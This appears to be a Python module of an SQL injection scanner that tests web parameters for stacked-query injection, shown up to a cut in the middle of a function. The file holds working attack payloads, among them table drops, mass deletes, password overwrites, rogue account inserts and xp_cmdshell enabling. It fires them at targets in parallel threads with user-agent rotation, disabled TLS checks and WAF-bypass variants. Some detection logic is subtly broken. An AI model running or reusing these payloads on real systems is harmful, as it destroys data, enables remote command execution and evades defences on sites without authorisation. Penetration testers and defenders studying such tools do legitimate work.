# stacked_queries.py
# Advanced stacked queries SQL injection detector with multiple database support

import statistics
import time
import requests
import urllib3
import random
import re
from urllib.parse import urlparse, parse_qs, urlencode
from typing import Dict, List, Tuple, Optional, Union, Any
import json
import xml.etree.ElementTree as ET
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import logging
from datetime import datetime

# Import your modules
from user_agents import AdvancedUserAgentRotator
from payload_generator import BasicDetectionPayloads, AdvancedDetectionPayloads, EnhancedPayloadGenerator
from bypass import AdvancedWAFBypass, SmartWAFBypass, generate_smart_bypass_payloads

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- Configuration / constants ------------------------------------------------
DEFAULT_SAMPLE_SIZE = 3
DEFAULT_CONFIDENCE_THRESHOLD = 0.8
MAX_PARALLEL_PAYLOADS = 6
DEFAULT_DELAY = 0.5

# Detection modes
DETECTION_MODES = {
    'basic': 'Basic stacked queries only',
    'basic_bypass': 'Basic payloads + WAF bypass',
    'advanced': 'Advanced stacked scenarios',
    'advanced_bypass': 'Advanced scenarios + WAF bypass'
}

# Database-specific stacked query support
STACKED_SUPPORT = {
    'mssql': {
        'enabled': True,
        'comment_style': '--',
        'query_separator': ';',
        'description': 'Microsoft SQL Server - Full stacked queries support'
    },
    'mysql': {
        'enabled': True,
        'comment_style': '--',
        'query_separator': ';',
        'description': 'MySQL - Limited stacked queries (PHP mysqli_multi_query)'
    },
    'postgresql': {
        'enabled': True,
        'comment_style': '--',
        'query_separator': ';',
        'description': 'PostgreSQL - Full stacked queries support'
    },
    'oracle': {
        'enabled': False,  # Oracle doesn't support stacked queries in same statement
        'comment_style': '--',
        'query_separator': ';',
        'description': 'Oracle - No stacked queries support (use PL/SQL blocks)'
    },
    'sqlite': {
        'enabled': True,
        'comment_style': '--',
        'query_separator': ';',
        'description': 'SQLite - Full stacked queries support'
    }
}

# Stacked query payload categories
STACKED_PAYLOADS = {
    'basic_detection': [
        "; SELECT 1--",
        "; SELECT 1,2--",
        "; SELECT 1,2,3--",
        "; SELECT @@version--",
        "; SELECT version()--"
    ],
    'time_based': [
        "; WAITFOR DELAY '0:0:5'--",
        "; SELECT SLEEP(5)--",
        "; SELECT pg_sleep(5)--",
        "; BEGIN; SELECT pg_sleep(5); COMMIT--"
    ],
    'data_manipulation': [
        "; DROP TABLE users--",
        "; DELETE FROM users--",
        "; UPDATE users SET password='hacked'--",
        "; INSERT INTO users (username, password) VALUES ('hacker', 'pwned')--"
    ],
    'information_extraction': [
        "; SELECT table_name FROM information_schema.tables--",
        "; SELECT name FROM sysdatabases--",
        "; SELECT datname FROM pg_database--",
        "; SELECT sql FROM sqlite_master--"
    ],
    'command_execution': [
        "; EXEC xp_cmdshell 'whoami'--",
        "; EXEC master..xp_cmdshell 'ipconfig'--",
        "; SELECT system('whoami')--"
    ],
    'conditional_stacking': [
        "' ; SELECT 1--",
        "'; SELECT 1--",
        "'); SELECT 1--",
        "')); SELECT 1--"
    ],
    'advanced_techniques': [
        "; EXEC sp_configure 'show advanced options', 1; RECONFIGURE--",
        "; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE--",
        "; DECLARE @cmd VARCHAR(255); SET @cmd = 'whoami'; EXEC master..xp_cmdshell @cmd--",
        "; CREATE TABLE test (data VARCHAR(255)); INSERT INTO test VALUES ('success'); SELECT * FROM test--"
    ]
}

# Response indicators for stacked queries
STACKED_INDICATORS = {
    'success_indicators': [
        'success', 'completed', 'executed', 'query executed',
        'table dropped', 'record inserted', 'record updated'
    ],
    'error_indicators': [
        'query executed successfully', 'command completed',
        'multiple statements', 'batch execution'
    ],
    'database_specific': {
        'mssql': [
            'xp_cmdshell', 'sp_configure', 'RECONFIGURE',
            'Msg 0', 'batch execution'
        ],
        'mysql': [
            'mysqli_multi_query', 'multiple queries',
            'query executed successfully'
        ],
        'postgresql': [
            'pg_sleep', 'transaction block', 'COMMIT',
            'multiple commands'
        ]
    }
}

# --- Helper utilities --------------------------------------------------------
def detect_stacked_support(response_text: str, headers: Dict) -> List[str]:
    """Detect which databases support stacked queries based on response."""
    supported_dbs = []
    
    # Check for database-specific indicators
    indicators = {
        'mssql': ['mssql', 'sql server', 'Microsoft SQL', 'xp_cmdshell'],
        'mysql': ['mysql', 'mysqli', 'MariaDB', 'sleep(', 'benchmark('],
        'postgresql': ['postgresql', 'pg_', 'PostgreSQL', 'pg_sleep'],
        'sqlite': ['sqlite', 'SQLite3', 'sqlite_master']
    }
    
    response_lower = response_text.lower()
    
    for db_type, db_indicators in indicators.items():
        for indicator in db_indicators:
            if indicator in response_lower:
                if db_type not in supported_dbs:
                    supported_dbs.append(db_type)
                break
    
    # Check headers for database indicators
    server_header = headers.get('Server', '').lower()
    x_powered_by = headers.get('X-Powered-By', '').lower()
    
    for db_type, db_indicators in indicators.items():
        for indicator in db_indicators:
            if indicator in server_header or indicator in x_powered_by:
                if db_type not in supported_dbs:
                    supported_dbs.append(db_type)
                break
    
    return supported_dbs

def analyze_stacked_response(response_text: str, payload: str, db_type: str) -> Dict[str, Any]:
    """Analyze response for stacked query execution indicators."""
    confidence = 0.0
    indicators_found = []
    response_lower = response_text.lower()
    
    # Check for success indicators
    for indicator in STACKED_INDICATORS['success_indicators']:
        if indicator in response_lower:
            confidence += 0.2
            indicators_found.append(f"Success indicator: {indicator}")
    
    # Check for error indicators that suggest execution
    for indicator in STACKED_INDICATORS['error_indicators']:
        if indicator in response_lower:
            confidence += 0.3
            indicators_found.append(f"Execution indicator: {indicator}")
    
    # Check database-specific indicators
    if db_type in STACKED_INDICATORS['database_specific']:
        for indicator in STACKED_INDICATORS['database_specific'][db_type]:
            if indicator in response_lower:
                confidence += 0.4
                indicators_found.append(f"Database-specific: {indicator}")
    
    # Check for payload-specific results
    if 'SELECT' in payload:
        # Look for numeric results from SELECT statements
        if any(str(i) in response_text for i in range(10)):
            confidence += 0.1
            indicators_found.append("Numeric output detected")
    
    if 'INSERT' in payload.upper():
        if any(word in response_lower for word in ['insert', 'added', 'created']):
            confidence += 0.2
            indicators_found.append("Insert operation indicator")
    
    if 'DROP' in payload.upper() or 'DELETE' in payload.upper():
        if any(word in response_lower for word in ['drop', 'delete', 'remove', 'truncate']):
            confidence += 0.3
            indicators_found.append("Destructive operation indicator")
    
    # Check for command execution results
    if 'whoami' in payload.lower() or 'ipconfig' in payload.lower():
        if any(cmd_result in response_lower for cmd_result in ['administrator', 'windows', 'ethernet', 'ipv4']):
            confidence += 0.5
            indicators_found.append("Command execution output")
    
    return {
        'confidence': min(1.0, confidence),
        'indicators': indicators_found,
        'indicators_count': len(indicators_found),
        'response_length': len(response_text),
        'is_successful': confidence >= 0.3
    }

def generate_contextual_payload(base_payload: str, db_type: str, context: str = 'detection') -> str:
    """Generate contextual stacked query payload."""
    # Add appropriate comment syntax
    if db_type in STACKED_SUPPORT:
        comment = STACKED_SUPPORT[db_type]['comment_style']
    else:
        comment = '--'
    
    # Ensure payload ends with comment
    if not base_payload.endswith(comment):
        base_payload += comment
    
    # Add context-specific modifications
    if context == 'time_based' and 'SLEEP' not in base_payload.upper():
        if db_type == 'mysql':
            base_payload = base_payload.replace('--', '; SELECT SLEEP(5)--')
        elif db_type == 'mssql':
            base_payload = base_payload.replace('--', "; WAITFOR DELAY '0:0:5'--")
        elif db_type == 'postgresql':
            base_payload = base_payload.replace('--', '; SELECT pg_sleep(5)--')
    
    return base_payload

# --- Enhanced HTTP Session ---------------------------------------------------
class ResilientHTTPSession:
    """HTTP session with retry logic and connection pooling."""
    
    def __init__(self, max_retries: int = 3, backoff_factor: float = 0.5):
        self.session = requests.Session()
        self.max_retries = max_retries
        self.backoff_factor = backoff_factor
        self._setup_session()
    
    def _setup_session(self):
        """Configure session with retry strategy."""
        retry_strategy = Retry(
            total=self.max_retries,
            backoff_factor=self.backoff_factor,
            status_forcelist=[429, 500, 502, 503, 504, 403],
            allowed_methods=["GET", "POST"]
        )
        
        adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=10, pool_maxsize=20)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        
        # Default headers
        self.session.headers.update({
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })
    
    def request(self, method: str, url: str, **kwargs) -> requests.Response:
        """Make HTTP request with enhanced error handling."""
        # Ensure verify=False for SSL
        kwargs['verify'] = False
        kwargs['timeout'] = kwargs.get('timeout', 30)
        kwargs['allow_redirects'] = kwargs.get('allow_redirects', False)
        
        return self.session.request(method, url, **kwargs)
    
    def close(self):
        """Close session."""
        self.session.close()

# --- Main Detector -----------------------------------------------------------
class AdvancedStackedQueriesDetector:
    """
    Advanced Stacked Queries SQL Injection Detector.
    """

    def __init__(self, config: Dict[str, Any] = None):
        self.config = config or {}
        self.sample_size = self.config.get('sample_size', DEFAULT_SAMPLE_SIZE)
        self.confidence_threshold = self.config.get('confidence_threshold', DEFAULT_CONFIDENCE_THRESHOLD)
        self.max_response_time = self.config.get('max_response_time', 30)
        self.max_payloads_per_param = self.config.get('max_payloads_per_param', 20)
        self.detection_mode = self.config.get('detection_mode', 'advanced_bypass')
        self.use_smart_bypass = self.config.get('use_smart_bypass', False)
        self.payloads_directory = self.config.get('payloads_directory', 'payloads')
        self.delay = self.config.get('delay', DEFAULT_DELAY)

        # Initialize components
        self._initialize_components()
        
        # HTTP session
        self.http_session = ResilientHTTPSession(
            max_retries=self.config.get('max_retries', 3),
            backoff_factor=self.config.get('backoff_factor', 0.5)
        )

        # Internal state
        self.request_history: List[Dict[str, Any]] = []
        self.baseline_responses: List[Dict] = []
        self.detected_databases: List[str] = []
        self.learning_data = []

        # Logging
        self.logger = self._setup_logging()
        self.logger.info(f"Initialized stacked queries detector with mode: {self.detection_mode}")

    def _initialize_components(self):
        """Initialize detection components based on selected mode."""
        # Always initialize these
        self.ua_rotator = AdvancedUserAgentRotator()
        self.waf_bypass = AdvancedWAFBypass()
        self.smart_bypass = SmartWAFBypass() if self.use_smart_bypass else None
        
        # Initialize payload sources based on mode
        if self.detection_mode in ['basic', 'basic_bypass']:
            self.payload_source = BasicDetectionPayloads()
            self.advanced_payloads = None
            self.payload_generator = None
        else:
            self.payload_source = BasicDetectionPayloads()  # Fallback
            self.advanced_payloads = AdvancedDetectionPayloads(self.payloads_directory)
            self.payload_generator = EnhancedPayloadGenerator(
                use_bypass=(self.detection_mode == 'advanced_bypass'),
                payloads_directory=self.payloads_directory,
                smart_learning=self.use_smart_bypass
            )

    def _setup_logging(self):
        logger = logging.getLogger('AdvancedStackedQueriesDetector')
        if not logger.handlers:
            handler = logging.StreamHandler()
            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
            handler.setFormatter(formatter)
            logger.addHandler(handler)
            logger.setLevel(logging.INFO)
        return logger

    # ----------------- Payload Management -------------------
    def _collect_stacked_payloads(self, db_hint: str = 'auto') -> List[Dict[str, Any]]:
        """Collect stacked query payloads based on detection mode."""
        payloads = []
        
        if self.detection_mode in ['basic', 'basic_bypass']:
            payloads = self._get_basic_stacked_payloads(db_hint)
        else:
            payloads = self._get_advanced_stacked_payloads(db_hint)
        
        # Apply bypass if enabled in mode
        if self.detection_mode in ['basic_bypass', 'advanced_bypass']:
            payloads = self._apply_bypass_to_payloads(payloads)
        
        return payloads[:self.max_payloads_per_param]

    def _get_basic_stacked_payloads(self, db_hint: str) -> List[Dict[str, Any]]:
        """Get basic stacked query payloads."""
        payloads = []
        
        # Determine which databases to target
        target_dbs = []
        if db_hint != 'auto':
            target_dbs = [db_hint]
        else:
            # Use detected databases or all supported
            target_dbs = self.detected_databases if self.detected_databases else ['mssql', 'mysql', 'postgresql', 'sqlite']
        
        for db_type in target_dbs:
            if not STACKED_SUPPORT.get(db_type, {}).get('enabled', False):
                continue
                
            for payload_type, payload_list in STACKED_PAYLOADS.items():
                for base_payload in payload_list[:4]:  # Limit per type
                    # Skip unsupported payloads for specific databases
                    if db_type == 'oracle' and ';' in base_payload:
                        continue  # Oracle doesn't support stacked queries
                    
                    contextual_payload = generate_contextual_payload(base_payload, db_type, payload_type)
                    
                    payloads.append({
                        'payload': contextual_payload,
                        'db': db_type,
                        'payload_type': payload_type,
                        'base_confidence': 0.7,
                        'description': f"{db_type} {payload_type}",
                        'source': 'basic'
                    })
        
        return payloads

    def _get_advanced_stacked_payloads(self, db_hint: str) -> List[Dict[str, Any]]:
        """Get advanced stacked query payloads."""
        payloads = []
        
        if not self.advanced_payloads:
            return self._get_basic_stacked_payloads(db_hint)
        
        # Get stacked queries specific payloads
        stacked_payloads = self.advanced_payloads.get_payloads_by_attack_type('stacked')
        
        for category, payload_list in stacked_payloads.items():
            for p in payload_list:
                if ';' in p and any(keyword in p.upper() for keyword in ['SELECT', 'INSERT', 'UPDATE', 'DELETE', 'DROP', 'EXEC']):
                    # Determine database type from payload
                    db_type = self._detect_db_from_payload(p)
                    if db_hint != 'auto' and db_type != db_hint:
                        continue
                    
                    payloads.append({
                        'payload': p,
                        'db': db_type,
                        'payload_type': 'advanced',
                        'base_confidence': 0.8,
                        'description': f"Advanced {category}",
                        'source': 'advanced'
                    })
        
        # Generate dynamic payloads based on detected databases
        target_dbs = self.detected_databases if self.detected_databases else ['mssql', 'mysql', 'postgresql']
        dynamic_payloads = self._generate_dynamic_stacked_payloads(target_dbs)
        payloads.extend(dynamic_payloads)
        
        # Add basic payloads as fallback
        if not payloads:
            payloads = self._get_basic_stacked_payloads(db_hint)
        
        return payloads

    def _detect_db_from_payload(self, payload: str) -> str:
        """Detect database type from payload content."""
        payload_upper = payload.upper()
        
        if 'WAITFOR DELAY' in payload_upper or 'xp_cmdshell' in payload_upper or 'sp_configure' in payload_upper:
            return 'mssql'
        elif 'pg_sleep' in payload_upper or 'pg_' in payload_upper:
            return 'postgresql'
        elif 'SLEEP(' in payload_upper or 'BENCHMARK' in payload_upper:
            return 'mysql'
        elif 'sqlite_master' in payload_upper:
            return 'sqlite'
        else:
            return 'generic'

    def _generate_dynamic_stacked_payloads(self, target_dbs: List[str]) -> List[Dict[str, Any]]:
        """Generate dynamic stacked query payloads."""
        payloads = []
        
        for db_type in target_dbs:
            if not STACKED_SUPPORT.get(db_type, {}).get('enabled', False):
                continue
            
            # Database-specific advanced payloads
            db_payloads = []
            
            if db_type == 'mssql':
                db_payloads = [
                    "; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE--",
                    "; DECLARE @result INT; EXEC @result = xp_cmdshell 'whoami'; SELECT @result--",
                    "; BEGIN TRY; DROP TABLE stacked_test; END TRY BEGIN CATCH; END CATCH; CREATE TABLE stacked_test (id INT);--"
                ]
            elif db_type == 'mysql':
                db_payloads = [
                    "; SET @test=1; SELECT @test--",
                    "; CREATE TEMPORARY TABLE stacked_test (id INT); INSERT INTO stacked_test VALUES (1); SELECT * FROM stacked_test--",
                    "; SELECT 1; SELECT 2; SELECT 3--"
                ]
            elif db_type == 'postgresql':
                db_payloads = [
                    "; BEGIN; DROP TABLE IF EXISTS stacked_test; CREATE TABLE stacked_test (id INT); COMMIT--",
                    "; SELECT current_database(); SELECT current_user; SELECT version()--",
                    "; COPY (SELECT 'stacked_success') TO '/tmp/stacked_test'--"
                ]
            
            for p in db_payloads:
                payloads.append({
                    'payload': p,
                    'db': db_type,
                    'payload_type': 'dynamic',
                    'base_confidence': 0.85,
                    'description': f"Dynamic {db_type} stacked",
                    'source': 'dynamic'
                })
        
        return payloads

    def _apply_bypass_to_payloads(self, original_payloads: List[Dict]) -> List[Dict]:
        """Apply WAF bypass techniques to stacked query payloads."""
        bypassed_payloads = []
        
        for original in original_payloads[:12]:  # Limit for performance
            raw_payload = original['payload']
            
            # Apply smart bypass if enabled
            if self.use_smart_bypass and self.smart_bypass:
                try:
                    smart_variants = self.smart_bypass.get_optimized_bypass(raw_payload, self.waf_bypass)
                    for variant in smart_variants[:2]:
                        bypassed_payloads.append({
                            'payload': variant,
                            'db': original['db'],
                            'payload_type': original['payload_type'],
                            'base_confidence': original['base_confidence'] * 0.95,
                            'description': original['description'] + ' (smart bypass)',
                            'source': original['source'] + '_bypass'
                        })
                except Exception as e:
                    self.logger.debug(f"Smart bypass failed: {e}")
            
            # Apply standard bypass techniques
            try:
                bypass_variants = self.waf_bypass.apply_all_bypasses(raw_payload, max_variations=2)
                for variant in bypass_variants:
                    if variant not in [p['payload'] for p in bypassed_payloads]:
                        bypassed_payloads.append({
                            'payload': variant,
                            'db': original['db'],
                            'payload_type': original['payload_type'],
                            'base_confidence': original['base_confidence'] * 0.9,
                            'description': original['description'] + ' (bypass)',
                            'source': original['source'] + '_bypass'
                        })
            except Exception as e:
                self.logger.debug(f"Standard bypass failed: {e}")
        
        # Combine original and bypassed payloads
        all_payloads = original_payloads + bypassed_payloads
        
        # Deduplicate
        seen = set()
        deduped = []
        for pl in all_payloads:
            if pl['payload'] not in seen:
                deduped.append(pl)
                seen.add(pl['payload'])
        
        return deduped

    # ----------------- Baseline Measurement -------------------
    def calculate_baseline(self, url: str, method: str = 'GET', headers: Dict = None, 
                         data: Dict = None, cookies: Dict = None, samples: int = 3) -> List[Dict]:
        """Measure baseline responses and detect databases."""
        self.logger.info(f"Calculating baseline with {samples} samples for {url}")
        baseline_responses = []
        headers = self._prepare_headers(headers)
        
        for i in range(samples):
            try:
                ok, response_text, sc, content_type, resp_headers = self._send_request(
                    url, method, headers=headers, data=data, cookies=cookies, safe_mode=True
                )
                if ok:
                    response_data = {
                        'text': response_text,
                        'status_code': sc,
                        'content_type': content_type,
                        'headers': resp_headers
                    }
                    baseline_responses.append(response_data)
                    
                    # Detect databases supporting stacked queries
                    detected_dbs = detect_stacked_support(response_text, resp_headers)
                    for db in detected_dbs:
                        if db not in self.detected_databases:
                            self.detected_databases.append(db)
                
                time.sleep(self.delay + random.random() * 0.2)
            except Exception as e:
                self.logger.debug(f"Baseline request {i+1} failed: {e}")
                continue

        self.baseline_responses = baseline_responses
        
        if self.detected_databases:
            self.logger.info(f"Detected databases supporting stacked queries: {', '.join(self.detected_databases)}")
        else:
            self.logger.info("No specific databases detected, using generic payloads")
        
        self.logger.info(f"Baseline established: {len(baseline_responses)} samples")
        
        return baseline_responses

    # ----------------- HTTP Communication -------------------
    def _prepare_headers(self, headers: Optional[Dict[str,str]] = None) -> Dict[str,str]:
        """Prepare headers with User-Agent rotation."""
        headers = (headers or {}).copy()
        if 'User-Agent' not in headers:
            ua = self.ua_rotator.get_user_agent()
            headers['User-Agent'] = ua
        return headers

    def _send_request(self, url: str, method: str = 'GET', headers: Dict = None, 
                     data: Any = None, cookies: Dict = None, safe_mode: bool = False, 
                     timeout: Optional[int] = None) -> Tuple[bool, str, int, str, Dict]:
        """Send HTTP request with comprehensive error handling."""
        if timeout is None:
            timeout = self.max_response_time

        headers = self._prepare_headers(headers)
        cookies = cookies or {}
        start = time.time()

        try:
            if method.upper() == 'GET':
                resp = self.http_session.request('GET', url, headers=headers, cookies=cookies, timeout=timeout)
            elif method.upper() == 'POST':
                ct = headers.get('Content-Type', '')
                if 'application/json' in ct and isinstance(data, (dict, list)):
                    payload = json.dumps(data)
                    resp = self.http_session.request('POST', url, headers=headers, cookies=cookies, data=payload, timeout=timeout)
                else:
                    resp = self.http_session.request('POST', url, headers=headers, cookies=cookies, data=data, timeout=timeout)
            else:
                resp = self.http_session.request(method, url, headers=headers, cookies=cookies, data=data, timeout=timeout)

            response_text = resp.text
            rt = time.time() - start
            
            if not safe_mode:
                self.request_history.append({
                    'timestamp': datetime.now(),
                    'response_time': rt,
                    'status_code': resp.status_code,
                    'url': url
                })
                
                # Collect learning data for smart bypass
                if self.use_smart_bypass:
                    self.learning_data.append((url, resp.status_code, resp.text))

            return True, response_text, resp.status_code, resp.headers.get('Content-Type', ''), dict(resp.headers)
            
        except requests.exceptions.Timeout:
            rt = time.time() - start
            self.logger.debug(f"Request timeout after {rt:.2f}s: {url}")
            return False, "Timeout", 0, "", {}
        except requests.RequestException as e:
            rt = time.time() - start
            self.logger.debug(f"Request failed: {e}")
            return False, str(e), 0, "", {}
        except Exception as e:
            rt = time.time() - start
            self.logger.debug(f"Unexpected error: {e}")
            return False, str(e), 0, "", {}

    # ----------------- Injection Helpers -------------------
    def _build_test_request(self, url: str, method: str, headers: Dict, 
                          data: Any, parameter: str, payload: str) -> Tuple[str, str, Dict, Any]:
        """Build test request with stacked query payload."""
        test_url = url
        test_method = method
        test_headers = headers.copy()
        test_data = data.copy() if hasattr(data, 'copy') else data

        if method.upper() == 'GET':
            parsed = urlparse(url)
            query_params = parse_qs(parsed.query)
            
            # Inject stacked payload into parameter
            if parameter in query_params:
                original_value = query_params[parameter][0]
                query_params[parameter] = [original_value + payload]
            else:
                query_params[parameter] = [payload]
            
            new_query = urlencode(query_params, doseq=True)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
        else:
            content_type = test_headers.get('Content-Type', '')
            
            if 'application/json' in content_type:
                if isinstance(test_data, str):
                    try:
                        json_data = json.loads(test_data)
                        if parameter in json_data:
                            json_data[parameter] = json_data[parameter] + payload
                        test_data = json.dumps(json_data)
                    except json.JSONDecodeError:
                        # Fallback to string replacement
                        test_data = test_data.replace(f'"{parameter}"', f'"{parameter}{payload}"')
                else:
                    if parameter in test_data:
                        test_data[parameter] = str(test_data[parameter]) + payload
                    
            elif isinstance(test_data, dict):
                if parameter in test_data:
                    test_data[parameter] = str(test_data[parameter]) + payload
                
            elif isinstance(test_data, str):
                test_data = test_data.replace(f"{parameter}=", f"{parameter}={payload}")

        return test_url, test_method, test_headers, test_data

    # ----------------- Stacked Query Analysis -------------------
    def analyze_stacked_execution(self, response_data: Dict, payload: str, 
                                db_type: str, baseline_responses: List[Dict]) -> Dict[str, Any]:
        """Analyze response for stacked query execution."""
        response_text = response_data.get('text', '')
        status_code = response_data.get('status_code', 0)
        
        # Basic analysis
        analysis = analyze_stacked_response(response_text, payload, db_type)
        
        # Additional factors
        if status_code == 200:
            analysis['confidence'] += 0.1
        
        # Compare with baseline
        if baseline_responses:
            baseline_texts = [r.get('text', '') for r in baseline_responses]
            if response_text not in baseline_texts:
                analysis['confidence'] += 0.2
                analysis['indicators'].append("Response differs from baseline")
        
        # Check for time-based execution
        if any(time_keyword in payload.upper() for time_keyword in ['SLEEP', 'WAITFOR', 'PG_SLEEP']):
            # Note: Actual timing would be handled by time-based detector
            analysis['indicators'].append("Time-based stacked query")
        
        return analysis

    # ----------------- Core Testing Logic -------------------
    def _test_single_payload(self, test_url: str, method: str, headers: Dict, 
                           data: Any, cookies: Dict, payload_info: Dict) -> Dict[str, Any]:
        """Test a single stacked query payload."""
        payload = payload_info['payload']
        payload_responses = []
        response_times = []
        
        for i in range(self.sample_size):
            try:
                start = time.time()
                ok, response_text, sc, content_type, resp_headers = self._send_request(
                    test_url, method, headers=headers, data=data, cookies=cookies
                )
                rt = time.time() - start
                response_times.append(rt)
                
                if ok:
                    response_data = {
                        'text': response_text,
                        'status_code': sc,
                        'content_type': content_type,
                        'headers': resp_headers
                    }
                    payload_responses.append(response_data)
                
                time.sleep(self.delay + random.random() * 0.2)
            except Exception as e:
                self.logger.debug(f"Test request {i+1} failed: {e}")
                continue

        # Analyze responses
        analysis_results = []
        for response in payload_responses:
            analysis = self.analyze_stacked_execution(
                response, 
                payload,
                payload_info['db'],
                self.baseline_responses
            )
            analysis_results.append(analysis)
        
        # Aggregate results
        if analysis_results:
            max_confidence = max(result['confidence'] for result in analysis_results)
            avg_confidence = statistics.mean(result['confidence'] for result in analysis_results)
            successful_count = sum(1 for result in analysis_results if result['is_successful'])
        else:
            max_confidence = 0.0
            avg_confidence = 0.0
            successful_count = 0

        return {
            'payload': payload,
            'payload_info': payload_info,
            'payload_responses': payload_responses,
            'analysis_results': analysis_results,
            'response_times': response_times,
            'max_confidence': max_confidence,
            'avg_confidence': avg_confidence,
            'successful_samples': successful_count,
            'total_samples': len(payload_responses)
        }

    def test_parameter(self, url: str, parameter: str, value: str = 'test', 
                     method: str = 'GET', headers: Dict = None, data: Any = None, 
                     cookies: Dict = None, database_type: str = 'auto') -> Dict[str, Any]:
        """Test a specific parameter for stacked queries SQL injection."""
        self.logger.info(f"Testing parameter '{parameter}' for stacked queries with mode: {self.detection_mode}")
        
        headers = self._prepare_headers(headers)
        cookies = cookies or {}
        original_data = data.copy() if hasattr(data, 'copy') else data

        # Calculate baseline if not done
        if not self.baseline_responses:
            self.calculate_baseline(url, method, headers, original_data, cookies)

        # Use detected databases or provided hint
        target_db = database_type
        if database_type == 'auto' and self.detected_databases:
            target_db = self.detected_databases[0]  # Use first detected

        # Get payloads based on detection mode
        all_payloads = self._collect_stacked_payloads(target_db)
        
        self.logger.info(f"Testing {len(all_payloads)} stacked query payload variants for parameter '{parameter}'")

        results_details = []
        vulnerable_payloads = []

        # Test payloads with threading
        with ThreadPoolExecutor(max_workers=min(MAX_PARALLEL_PAYLOADS, len(all_payloads) or 1)) as executor:
            future_to_payload = {}
            
            for pl in all_payloads:
                test_url, test_method, test_headers, test_data = self._build_test_request(
                    url, method, headers, original_data, parameter, pl['payload']
                )
                
                future = executor.submit(
                    self._test_single_payload, test_url, test_method, test_headers, 
                    test_data, cookies, pl
                )
                future_to_payload[future] = pl

            for future in as_completed(future_to_payload):
                pl = future_to_payload[future]
                try:
                    result = future.result()
                    
                    combined_conf = result['max_confidence'] * pl['base_confidence']
                    
                    result_entry = {
                        'payload': pl['payload'],
                        'database_type': pl['db'],
                        'description': pl.get('description', ''),
                        'payload_type': pl.get('payload_type', 'basic'),
                        'analysis_results': result['analysis_results'],
                        'max_confidence': result['max_confidence'],
                        'avg_confidence': result['avg_confidence'],
                        'successful_samples': result['successful_samples'],
                        'total_samples': result['total_samples'],
                        'combined_confidence': combined_conf,
                        'detection_mode': self.detection_mode,
                        'vulnerable': False
                    }

                    if (combined_conf >= self.confidence_threshold and 
                        result['successful_samples'] >= max(2, int(self.sample_size * 0.5))):
                        result_entry['vulnerable'] = True
                        vulnerable_payloads.append(result_entry)

                    results_details.append(result_entry)
                    
                    self.logger.info(
                        f"Payload tested: max_conf={result['max_confidence']:.3f}, "
                        f"combined={combined_conf:.3f}, vulnerable={result_entry['vulnerable']}"
                    )
                    
                except Exception as e:
                    self.logger.error(f"Error testing payload: {e}")

        # Compile final results
        overall_confidence = max((v['combined_confidence'] for v in vulnerable_payloads), default=0.0)
        
        return {
            'parameter': parameter,
            'database_type': target_db,
            'vulnerable': len(vulnerable_payloads) > 0,
            'confidence': overall_confidence,
            'payloads_tested': len(results_details),
            'successful_payloads': vulnerable_payloads,
            'detected_databases': self.detected_databases,
            'detection_mode': self.detection_mode,
            'details': results_details
        }

    # ----------------- Scanning Methods -------------------
    def _extract_parameters(self, target: Dict[str, Any]) -> List[str]:
        """Extract all parameters from target configuration."""
        params = []
        
        parsed = urlparse(target['url'])
        params.extend(parse_qs(parsed.query).keys())
        
        if target.get('method', 'GET').upper() == 'POST':
            data = target.get('data')
            if isinstance(data, dict):
                params.extend(data.keys())
            elif isinstance(data, str):
                try:
                    json_data = json.loads(data)
                    if isinstance(json_data, dict):
                        params.extend(json_data.keys())
                except json.JSONDecodeError:
                    params.extend(parse_qs(data).keys())
        
        return list(dict.fromkeys(params))

    def comprehensive_scan(self, target: Dict[str, Any]) -> Dict[str, Any]:
        """Perform comprehensive stacked queries SQL injection scan."""
        self.logger.info(f"Starting comprehensive stacked queries scan for {target.get('url')} with mode: {self.detection_mode}")
        
        if not self.baseline_responses:
            self.calculate_baseline(
                target['url'], 
                target.get('method', 'GET'), 
                target.get('headers'), 
                target.get('data'), 
                target.get('cookies')
            )

        parameters = self._extract_parameters(target)
        scan_start = datetime.now()
        
        results = {
            'target': target,
            'detection_mode': self.detection_mode,
            'parameters_tested': [],
            'vulnerable_parameters': [],
            'detected_databases': self.detected_databases,
            'scan_start': scan_start
        }

        for param in parameters:
            self.logger.info(f"Testing parameter: {param}")
            
            param_result = self.test_parameter(
                target['url'], param,
                value=(target.get('data') or {}).get(param, 'test'),
                method=target.get('method', 'GET'),
                headers=target.get('headers'),
                data=target.get('data'),
                cookies=target.get('cookies'),
                database_type=target.get('database_type', 'auto')
            )
            
            results['parameters_tested'].append(param_result)
            
            if param_result['vulnerable']:
                results['vulnerable_parameters'].append(param_result)

        results['scan_duration'] = (datetime.now() - scan_start).total_seconds()
        results['vulnerability_count'] = len(results['vulnerable_parameters'])
        
        self._generate_scan_summary(results)
        return results

    def targeted_scan(self, target: Dict[str, Any], specific_dbs: List[str] = None) -> Dict[str, Any]:
        """Perform targeted stacked queries scan for specific databases."""
        self.logger.info(f"Starting targeted stacked queries scan for {target.get('url')}")
        
        parameters = self._extract_parameters(target)
        scan_start = datetime.now()
        
        results = {
            'target': target,
            'detection_mode': self.detection_mode,
            'parameters_tested': [],
            'vulnerable_parameters': [],
            'targeted_databases': specific_dbs,
            'scan_start': scan_start
        }

        for param in parameters:
            for db_type in (specific_dbs or ['mssql', 'mysql', 'postgresql']):
                self.logger.info(f"Testing parameter: {param} for {db_type}")
                
                param_result = self.test_parameter(
                    target['url'], param,
                    value=(target.get('data') or {}).get(param, 'test'),
                    method=target.get('method', 'GET'),
                    headers=target.get('headers'),
                    data=target.get('data'),
                    cookies=target.get('cookies'),
                    database_type=db_type
                )
                
                results['parameters_tested'].append(param_result)
                
                if param_result['vulnerable']:
                    results['vulnerable_parameters'].append(param_result)

        results['scan_duration'] = (datetime.now() - scan_start).total_seconds()
